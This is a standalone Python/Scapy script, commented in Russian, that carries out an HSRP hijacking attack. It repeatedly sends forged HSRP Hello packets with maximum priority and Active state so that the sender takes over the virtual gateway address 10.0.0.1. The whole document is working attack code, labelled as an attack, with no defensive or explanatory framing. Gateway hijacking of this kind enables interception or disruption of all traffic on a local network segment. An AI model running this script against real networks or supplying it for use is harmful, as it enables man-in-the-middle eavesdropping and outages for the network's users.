#!/usr/bin/env python3
from scapy.all import *
import time

def main():
    attacker_ip = "10.0.0.100"
    attacker_mac = get_if_hwaddr(conf.iface) # Извлекаем свой реальный MAC-адрес
    virtual_ip = "10.0.0.1"

    print(f"[*] Запуск HSRP Coup d'état... Целевой VIP: {virtual_ip}")

    # 1. Формируем слои (один раз вне цикла, чтобы не грузить CPU)
    # L2: От нашего MAC на Multicast MAC адрес HSRP
    eth = Ether(src=attacker_mac, dst="01:00:5e:00:00:02")
    
    # L3: От нашего IP на Multicast IP адрес HSRP
    ip = IP(src=attacker_ip, dst="224.0.0.2")
    
    # L4: UDP порты 1985
    udp = UDP(sport=1985, dport=1985)
    
    # L7: HSRP (Приоритет 255 - Максимум, Состояние 16 - Active)
    hsrp = HSRP(group=1, priority=255, state=16, virtualIP=virtual_ip)
    
    # Склеиваем матрешку
    hijack_packet = eth / ip / udp / hsrp

    try:
        # 2. Удержание роли Active-роутера (Спамим каждые 3 секунды)
        while True:
            sendp(hijack_packet, verbose=False)
            print(f"[+] HSRP Hello отправлен (Priority 255). Мы — новый шлюз {virtual_ip}!")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[-] Атака прервана. Роль Active вернется легитимному роутеру.")

if __name__ == "__main__":
    main()